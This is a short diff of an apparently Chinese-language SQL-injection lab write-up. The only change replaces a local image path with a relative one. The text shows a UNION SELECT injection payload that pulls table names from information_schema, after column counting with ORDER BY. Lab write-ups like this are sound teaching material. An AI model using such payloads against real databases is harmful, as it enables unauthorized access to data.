@@ -6,6 +6,5 @@
 
 开始使用order by 语句猜字段数，在4时查询失败，可知有3个可显示位，接下来看是否过滤union select字段，结果发现没有过滤
 
-于是使用1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #语句获取表名
+于是使用1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #语句获取表名![](.\image\basicsql-1.png)
 
-<img src="C:\Users\PC\AppData\Roaming\Typora\typora-user-images\image-20200314221730649.png" alt="image-20200314221730649" style="zoom:75%;" />
